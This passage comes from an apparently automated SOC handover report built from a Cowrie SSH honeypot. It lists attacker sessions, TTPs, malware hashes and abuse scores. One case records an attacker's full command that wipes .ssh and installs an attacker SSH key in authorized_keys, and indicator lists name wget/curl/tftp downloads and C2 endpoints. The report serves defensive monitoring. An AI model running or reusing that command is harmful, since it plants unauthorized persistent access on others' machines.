|---|---|
| `2026-07-03 22:41:02` | `cowrie.session.connect` |
| `2026-07-03 22:41:04` | `cowrie.client.version` |
| `2026-07-03 22:41:04` | `cowrie.client.kex` |
| `2026-07-03 22:41:09` | `cowrie.login.success` |
| `2026-07-03 22:41:13` | `cowrie.session.params` |
| `2026-07-03 22:41:13` | `cowrie.command.input` |
| `2026-07-03 22:41:15` | `cowrie.log.closed` |
| `2026-07-03 22:41:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2956d1549359

| Field | Detail |
|---|---|
| **Source IP** | `81.177.101[.]45` |
| **First Seen** | 2026-07-03 22:41 |
| **Last Seen** | 2026-07-03 22:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:41:54` | `cowrie.session.connect` |
| `2026-07-03 22:41:54` | `cowrie.client.version` |
| `2026-07-03 22:41:54` | `cowrie.client.kex` |
| `2026-07-03 22:41:54` | `cowrie.login.success` |
| `2026-07-03 22:41:55` | `cowrie.session.params` |
| `2026-07-03 22:41:55` | `cowrie.command.input` |
| `2026-07-03 22:41:55` | `cowrie.command.failed` |
| `2026-07-03 22:41:55` | `cowrie.log.closed` |
| `2026-07-03 22:41:56` | `cowrie.session.params` |
| `2026-07-03 22:41:56` | `cowrie.command.input` |
| `2026-07-03 22:41:56` | `cowrie.session.file_download` |
| `2026-07-03 22:41:56` | `cowrie.log.closed` |
| `2026-07-03 22:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.177.101[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.177.101[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3333f314a2d6

| Field | Detail |
|---|---|
| **Source IP** | `81.177.101[.]45` |
| **First Seen** | 2026-07-03 22:41 |
| **Last Seen** | 2026-07-03 22:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:41:56` | `cowrie.session.connect` |
| `2026-07-03 22:41:56` | `cowrie.client.version` |
| `2026-07-03 22:41:56` | `cowrie.client.kex` |
| `2026-07-03 22:41:57` | `cowrie.login.success` |
| `2026-07-03 22:41:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.177.101[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.177.101[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb3f5992ce86

| Field | Detail |
|---|---|
| **Source IP** | `81.177.101[.]45` |
| **First Seen** | 2026-07-03 22:41 |
| **Last Seen** | 2026-07-03 22:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:41:57` | `cowrie.session.connect` |
| `2026-07-03 22:41:57` | `cowrie.client.version` |
| `2026-07-03 22:41:57` | `cowrie.client.kex` |
| `2026-07-03 22:41:58` | `cowrie.login.success` |
| `2026-07-03 22:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.177.101[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.177.101[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db815295a8d4

| Field | Detail |
|---|---|
| **Source IP** | `106.12.241[.]195` |
| **First Seen** | 2026-07-03 22:43 |
| **Last Seen** | 2026-07-03 22:48 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:43:00` | `cowrie.session.connect` |
| `2026-07-03 22:43:00` | `cowrie.client.version` |
| `2026-07-03 22:43:01` | `cowrie.client.kex` |
| `2026-07-03 22:43:01` | `cowrie.login.success` |
| `2026-07-03 22:48:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.12.241[.]195` to AbuseIPDB if not already reported
- [ ] Block `106.12.241[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18a124563d71

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]225` |
| **First Seen** | 2026-07-03 22:47 |
| **Last Seen** | 2026-07-03 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:47:37` | `cowrie.session.connect` |
| `2026-07-03 22:47:37` | `cowrie.client.version` |
| `2026-07-03 22:47:37` | `cowrie.client.kex` |
| `2026-07-03 22:47:37` | `cowrie.login.success` |
| `2026-07-03 22:47:37` | `cowrie.session.params` |
| `2026-07-03 22:47:37` | `cowrie.command.input` |
| `2026-07-03 22:47:37` | `cowrie.log.closed` |
| `2026-07-03 22:47:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87c4ed3b1d9c

| Field | Detail |
|---|---|
| **Source IP** | `106.12.241[.]195` |
| **First Seen** | 2026-07-03 22:48 |
| **Last Seen** | 2026-07-03 22:53 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:48:55` | `cowrie.session.connect` |
| `2026-07-03 22:48:55` | `cowrie.client.version` |
| `2026-07-03 22:48:55` | `cowrie.client.kex` |
| `2026-07-03 22:48:56` | `cowrie.login.success` |
| `2026-07-03 22:53:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.12.241[.]195` to AbuseIPDB if not already reported
- [ ] Block `106.12.241[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35d0ada43408

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-03 22:52 |
| **Last Seen** | 2026-07-03 22:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:52:45` | `cowrie.session.connect` |
| `2026-07-03 22:52:45` | `cowrie.client.version` |
| `2026-07-03 22:52:45` | `cowrie.client.kex` |
| `2026-07-03 22:52:45` | `cowrie.login.success` |
| `2026-07-03 22:52:45` | `cowrie.direct-tcpip.request` |
| `2026-07-03 22:52:46` | `cowrie.direct-tcpip.data` |
| `2026-07-03 22:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d669e644e3f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 22:52 |
| **Last Seen** | 2026-07-03 22:52 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:52:46` | `cowrie.session.connect` |
| `2026-07-03 22:52:47` | `cowrie.client.version` |
| `2026-07-03 22:52:47` | `cowrie.client.kex` |
| `2026-07-03 22:52:51` | `cowrie.login.success` |
| `2026-07-03 22:52:56` | `cowrie.session.params` |
| `2026-07-03 22:52:56` | `cowrie.command.input` |
| `2026-07-03 22:52:57` | `cowrie.log.closed` |
| `2026-07-03 22:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d301e80efdda

| Field | Detail |
|---|---|
| **Source IP** | `106.12.241[.]195` |
| **First Seen** | 2026-07-03 22:53 |
| **Last Seen** | 2026-07-03 22:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:53:34` | `cowrie.session.connect` |
| `2026-07-03 22:53:34` | `cowrie.client.version` |
| `2026-07-03 22:53:34` | `cowrie.client.kex` |
| `2026-07-03 22:53:35` | `cowrie.login.success` |

**Recommended Actions:**
- [ ] Submit `106.12.241[.]195` to AbuseIPDB if not already reported
- [ ] Block `106.12.241[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.34.173[.]23` | **30** | 2026-07-03 21:44 | 2026-07-03 21:44 | 44m | 0 | `T1592` | 🟠 MEDIUM |
| `34.38.159[.]252` | **30** | 2026-07-03 22:20 | 2026-07-03 22:21 | 11m | 0 | `T1592` | 🟠 MEDIUM |
| `35.195.32[.]146` | **30** | 2026-07-03 21:57 | 2026-07-03 21:58 | 31m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **9** | 2026-07-03 21:01 | 2026-07-03 22:33 | 9m | 0 | `T1592` | 🟢 LOW |
| `115.190.126[.]161` | **2** | 2026-07-03 21:51 | 2026-07-03 21:53 | 2m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]224` | **2** | 2026-07-03 22:22 | 2026-07-03 22:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-07-03 21:54 | 2026-07-03 21:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **2** | 2026-07-03 21:48 | 2026-07-03 21:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | **2** | 2026-07-03 21:04 | 2026-07-03 21:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-07-03 22:36 | 2026-07-03 22:36 | 10s | 0 | `T1592` | 🟢 LOW |
| `115.191.22[.]111` | 1 | 2026-07-03 21:04 | 2026-07-03 21:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.232.177[.]187` | 1 | 2026-07-03 21:05 | 2026-07-03 21:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `124.70.70[.]201` | 1 | 2026-07-03 22:46 | 2026-07-03 22:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]237` | 1 | 2026-07-03 22:43 | 2026-07-03 22:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `154.90.70[.]69` | 1 | 2026-07-03 22:27 | 2026-07-03 22:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | 1 | 2026-07-03 21:26 | 2026-07-03 21:28 | 67s | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | 1 | 2026-07-03 22:22 | 2026-07-03 22:23 | 40s | 0 | `T1592` | 🟢 LOW |
| `43.247.250[.]115` | 1 | 2026-07-03 22:40 | 2026-07-03 22:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]170` | 1 | 2026-07-03 22:06 | 2026-07-03 22:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.129.182[.]164` | 1 | 2026-07-03 22:29 | 2026-07-03 22:30 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 42/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 64/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 77/100 | 🔴 HIGH | **19/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `172.210.53[.]225` | US | Microsoft Limited | **100** ⚠️ | 1 |
| `158.178.141[.]210` | AU | Oracle Corporation | **100** ⚠️ | 2 |
| `34.38.159[.]252` | BE | Google LLC | **100** ⚠️ | 1 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 7 |
| `176.53.159[.]198` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 10 |
| `159.65.233[.]253` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `118.193.39[.]103` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `67.220.180[.]114` | US | Host World Net LLC | **100** ⚠️ | 18 |
| `207.154.250[.]9` | DE | DigitalOcean, LLC | **100** ⚠️ | 22 |
| `5.129.182[.]164` | RU | Ediniy Operator Svyazi LLC | **100** ⚠️ | 6 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 90 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 88 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 18 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 16 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 2 |

---

## 🔕 False Positive Summary (58 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 55 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 267 cases |
| Tool 34  | Credential Extractor        | ✅ 94 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 50 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 58 filtered (21.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 36 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 89 priority case(s) shown individually · 20 recon entry/entries in table (9 group(s) consolidating 109 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
